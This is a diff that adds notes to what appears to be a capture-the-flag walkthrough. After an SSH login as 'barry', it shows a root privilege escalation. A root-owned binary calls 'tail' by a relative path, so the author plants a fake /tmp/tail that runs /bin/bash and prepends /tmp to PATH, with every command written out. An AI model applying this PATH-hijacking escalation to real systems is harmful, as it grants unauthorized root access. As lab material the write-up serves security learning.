@@ -97,6 +97,34 @@ lets try to ssh using barry and above password
 ssh -i id_rsa barry@10.10.238.61
 cat user.txt > userflag
 
+strings live_log -> will show the content of live_log
+tail -f /var/log/nginx/access.log
+tail command is used to last part of the file usually logs or output files
+/usr/bin/tail -> this is the absolute path of the tail when it runs
+
+in the live_log it shows simply tail -f /var/log and not like /usr/bin/tail so it is not running with absolute path
+So, we can manipulate environment path to the folder where we can create fake tail with /bin/bash
+
+so in linux each command is executable file. here our tail instead of reading last lines will start a shell
+Now tail will be run in live_log which is owneby by root and hence shell will start as root.
+
+Lets make this in temp folder and we have read/write permission in temp folder
+echo "/bin/bash" > tail 
+chmod +x tail -> make this file executable
+export PATH=/tmp:$PATH -> we changed the path to our /tmp
+barry@mustacchio:/tmp$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+
+lets run live_log
+./live_log
+
+We get root access and hence root flag.
+
+Thank you
+
+
+
+
 
 
 
